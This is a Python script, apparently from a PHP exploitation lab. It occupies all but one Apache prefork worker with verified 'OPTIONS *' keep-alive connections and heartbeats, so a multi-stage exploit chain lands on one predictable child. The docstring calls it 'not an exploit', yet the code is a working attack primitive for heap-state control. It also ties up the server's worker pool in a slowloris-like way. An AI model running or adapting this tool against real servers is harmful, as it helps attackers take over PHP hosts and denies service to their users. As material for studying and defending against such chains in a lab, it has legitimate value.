#!/usr/bin/env python3
# INDEX: fence prefork workers via options keep-alive | apache | prefork mpm
"""OPTIONS-heartbeat keep-alive worker fencing for prefork mod_php.

Worker-AFFINITY primitive (not an exploit): parks worker_count-1 prefork
children on verified keep-alive connections, collapsing the pool onto one free
child, and HOLDS it there across a chain longer than KeepAliveTimeout (Debian/
official default 5s) via heartbeats. Two mechanics:

  1. PHP-FREE parking via `OPTIONS *`. Apache answers `OPTIONS *` from its core
     (ap_send_http_options); mod_php is never dispatched, so a parked child
     never enters RINIT, never touches session globals or the ZendMM heap, and
     its allocator history cannot be spoiled by the act of parking it.
  2. HEARTBEAT refresh. A cheap `OPTIONS *` on every parked socket resets its
     KeepAliveTimeout; pinging between chain stages keeps all W-1 children
     fenced for a slow chain. Each ping is verified (200 / Content-Length: 0 /
     no `Connection: close`); a recycled child surfaces as a failed heartbeat
     instead of a silent scatter.

Precondition: prefork MPM (one connection == one child for the connection's
life). Ported from dimasma0305/... as re-expressed by LyesH4ck/php2shell-lab
(`PreforkParking`, protocol "prefork-keepalive-fencing/v1"). stdlib only; safe
under `python3 -I`.

Usage:
    # demo against the 10-child lab (lab/apache-pool, port 8093):
    python3 -I keepalive_fence.py 127.0.0.1 8093 10
"""
from __future__ import annotations

import hashlib
import socket
import time


class FenceError(RuntimeError):
    pass


class PreforkFence:
    """Fence N-1 prefork children on verified OPTIONS keep-alive connections,
    collapsing the pool onto one free child and holding it there across a long
    chain via heartbeats."""

    PROTOCOL = "prefork-keepalive-fencing/v1"

    def __init__(self, host, port, worker_count=10, settle=0.2, timeout=15.0):
        self.host = host
        self.port = port
        self.worker_count = worker_count
        self.settle = settle
        self.timeout = timeout
        self.conns: list[socket.socket] = []
        self.events: list[dict] = []
        self.closed = False

    # low level
    def _connect(self) -> socket.socket:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(self.timeout)
        return s

    def _options(self, s: socket.socket) -> bytes:
        """Send one `OPTIONS *` on an existing keep-alive socket and validate
        the response. Returns the raw response bytes. Raises FenceError if the
        child was recycled / the connection no longer behaves as a live pin."""
        req = (f"OPTIONS * HTTP/1.1\r\nHost: {self.host}\r\n"
               f"Connection: keep-alive\r\nContent-Length: 0\r\n\r\n").encode("ascii")
        try:
            s.sendall(req)
        except OSError as e:
            raise FenceError(f"heartbeat send failed: {e}") from e
        buf = bytearray()
        try:
            while b"\r\n\r\n" not in buf:
                if len(buf) >= 65536:
                    raise FenceError("OPTIONS header exceeds 65536 bytes")
                blk = s.recv(65536 - len(buf))
                if not blk:
                    raise FenceError("connection closed before OPTIONS response")
                buf += blk
        except OSError as e:
            raise FenceError(f"heartbeat recv failed: {e}") from e
        head = bytes(buf).split(b"\r\n\r\n", 1)[0]
        lines = head.split(b"\r\n")
        f = lines[0].split(b" ", 2)
        if len(f) < 2 or not f[1].isdigit() or int(f[1]) != 200:
            raise FenceError(f"unexpected OPTIONS status: {lines[0][:120]!r}")
        hdrs: dict[bytes, list[bytes]] = {}
        for ln in lines[1:]:
            name, colon, val = ln.partition(b":")
            if colon:
                hdrs.setdefault(name.strip().lower(), []).append(val.strip().lower())
        conn_tokens = {t.strip() for v in hdrs.get(b"connection", [])
                       for t in v.split(b",") if t.strip()}
        if b"close" in conn_tokens:
            raise FenceError("OPTIONS response requested Connection: close")
        return bytes(buf)

    # public API
    @property
    def parked_count(self) -> int:
        return len(self.conns)

    def acquire(self) -> int:
        """Park worker_count-1 children via verified OPTIONS keep-alive conns.
        Returns the number parked. Leaves exactly one child free."""
        target = self.worker_count - 1
        if target <= 0:
            return 0
        try:
            for i in range(target):
                s = self._connect()
                try:
                    resp = self._options(s)
                except Exception:
                    s.close()
                    raise
                self.conns.append(s)
                self.events.append({"event": "open", "connection": i + 1,
                                    "unix_ns": time.time_ns(),
                                    "sha256": hashlib.sha256(resp).hexdigest()})
                if self.settle:
                    time.sleep(self.settle)
            # prove every socket is still open and refresh its timeout right
            # before the caller starts its run
            self.heartbeat("acquired")
            return self.parked_count
        except Exception:
            self.close()
            raise

    def heartbeat(self, label: str = "") -> None:
        """Refresh every parked connection's KeepAliveTimeout. Raises
        FenceError naming the first lost pin (do not keep running a chain whose
        fence has decayed)."""
        for i, s in enumerate(self.conns, start=1):
            try:
                resp = self._options(s)
            except FenceError as e:
                self.events.append({"event": "heartbeat-failed", "label": label,
                                    "connection": i, "unix_ns": time.time_ns(),
                                    "error": str(e)})
                raise FenceError(f"lost parked connection {i} at {label!r}: {e}") from e
            self.events.append({"event": "heartbeat", "label": label, "connection": i,
                                "unix_ns": time.time_ns(),
                                "sha256": hashlib.sha256(resp).hexdigest()})

    def hold(self, seconds: float, interval: float = 3.0, label: str = "hold") -> None:
        """Keep the fence alive for `seconds`, heartbeating every `interval`
        (must be < KeepAliveTimeout, default server value 5s)."""
        end = time.time() + seconds
        while time.time() < end:
            time.sleep(min(interval, max(0.0, end - time.time())))
            self.heartbeat(label)

    def close(self) -> None:
        if self.closed:
            return
        for s in self.conns:
            try:
                s.close()
            except OSError:
                pass
        n = len(self.conns)
        self.conns.clear()
        if n:
            self.events.append({"event": "close-all", "connection_count": n,
                                "unix_ns": time.time_ns()})
        self.closed = True

    def __enter__(self):
        self.acquire()
        return self

    def __exit__(self, *_exc):
        self.close()
        return False


def _pid(host, port, path="/pid.php", timeout=5.0):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                  f"Connection: close\r\n\r\n".encode("ascii"))
        buf = b""
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    finally:
        s.close()
    return buf.rsplit(b"\r\n\r\n", 1)[-1].strip().decode("latin1", "replace")


if __name__ == "__main__":
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8093
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    with PreforkFence(host, port, workers) as fence:
        print(f"parked {fence.parked_count}/{workers} children via OPTIONS * "
              f"(no mod_php dispatch)")
        pins = [_pid(host, port) for _ in range(6)]
        print(f"fresh /pid.php -> {pins}  (distinct: {sorted(set(pins))})")
        print("holding the fence 8s with 3s heartbeats ...")
        fence.hold(8.0, interval=3.0)
        pins2 = [_pid(host, port) for _ in range(6)]
        print(f"after hold    -> {pins2}  (distinct: {sorted(set(pins2))})")
